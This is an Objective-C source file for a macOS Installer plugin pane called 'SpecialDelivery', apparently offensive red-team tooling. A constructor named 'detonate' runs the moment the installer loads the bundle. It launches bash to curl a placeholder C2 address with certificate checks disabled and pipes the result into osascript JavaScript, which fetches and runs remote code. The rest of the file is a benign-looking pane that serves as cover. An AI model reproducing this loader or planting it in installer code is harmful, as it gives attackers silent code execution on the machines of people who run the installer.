//
//  MyInstallerPane.m
//  SpecialDelivery
//
//  Created by xorrior on 5/2/20.
//  Copyright © 2020 xorrior. All rights reserved.
//

#import "MyInstallerPane.h"
#include <stdio.h>
#include <Foundation/Foundation.h>
#import <OSAKit/OSAKit.h>
#include <CoreServices/CoreServices.h>
#include <Cocoa/Cocoa.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <assert.h>

// This code executes when the bundle is initially loaded by the InstallerRemotePluginService
__attribute__((constructor)) static void detonate()
{
    
        NSTask *task = [[NSTask alloc] init];
    	[task setLaunchPath:@"/bin/bash"];
    	[task setArguments:@[ @"-c", @"/usr/bin/curl -k 'apfellAddress' | /usr/bin/osascript -l JavaScript &" ]];
    	[task launch];

}

@implementation MyInstallerPane

- (NSString *)title
{
    return [[NSBundle bundleForClass:[self class]] localizedStringForKey:@"PaneTitle" value:nil table:nil];
}

- (void)willEnterPane:(InstallerSectionDirection)dir {
    // This winodw
}

- (void) willExitPane:(InstallerSectionDirection)dir {
    return;
}

- (BOOL)shouldExitPane:(InstallerSectionDirection)dir
{
    return YES;
}

@end
